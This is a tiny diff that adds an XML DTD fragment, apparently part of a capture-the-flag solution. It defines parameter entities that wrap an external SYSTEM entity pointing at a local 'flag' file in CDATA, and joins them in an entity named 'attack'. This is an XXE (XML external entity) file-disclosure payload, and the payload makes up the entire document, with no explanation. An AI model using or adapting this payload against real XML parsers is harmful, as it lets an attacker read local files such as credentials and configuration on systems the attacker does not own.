@@ -1,0 +1,4 @@
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "file:///flag_c24ccdfc008851700f2249ad5a9ca9f0">
+<!ENTITY % end "]]>">
+<!ENTITY attack "%start;%stuff;%end;">
